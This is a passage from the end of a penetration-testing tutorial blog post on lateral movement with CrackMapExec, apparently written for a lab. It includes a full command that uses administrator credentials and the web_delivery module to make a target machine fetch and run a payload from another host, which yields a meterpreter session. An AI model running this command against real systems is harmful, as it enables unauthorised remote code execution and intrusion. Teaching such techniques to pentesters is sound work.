+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-DzQ7rgdAcLs/XrQGyZ0BiwI/AAAAAAAAj74/YFC53Tgm3zkJvA-mMSYjEdV1PGojN9ygQCLcBGAsYHQ/s1600/34.png" alt=" Lateral Movement using CrackMapExec" width="714" height="266"/></p>
+<p><span style="color: #000000;">It will create a link as it is shown in the image above. Copy that link and remotely execute it in the target machine through CME using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M web_delivery -o URL=http://192.168.1.112:8080/rlNdPdZQMeYWLF</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-cSS-AQ15wa4/XrQGykTlf_I/AAAAAAAAj78/3GREYpoomAIELdogs5ixwAMH_rG-lcXGwCLcBGAsYHQ/s1600/35.png"/></p>
+<p><span style="color: #000000;">And once the above command is executed successfully, you will have the meterpreter session as shown in the following image:</span></p>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-xpVOUs2vEQ4/XrQGy5K7OGI/AAAAAAAAj8A/HKi6pzVOdxQDoscokJE0-Os7P_aasFqBQCLcBGAsYHQ/s1600/36.png" alt=" Lateral Movement using CrackMapExec" width="618" height="327"/></p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;">Enumeration is an intense task in any Penetration Testing as well as Red Team Assessment. But we saw that with the help of Crackmapexec or CME it seems quite easier and faster. Lateral Movement can take a huge amount of time if not done properly in an environment. But CME provides us with this functionality in just a single execution that any script kiddie can manipulate and perform. Overall, this proves that CME is an important tool for Situational Awareness and Lateral Movement, and it should be in every pentester’s arsenal.</span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Yashika Dhir is a Cyber Security Researcher, Penetration Tester, Red Teamer, and Purple Team enthusiast. Contact her on</span> <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/yashika-dhir/">Linkedin</a> </span></strong><span style="color: #000000;">and </span><span style="color: #0000ff;"><strong>Twitter</strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
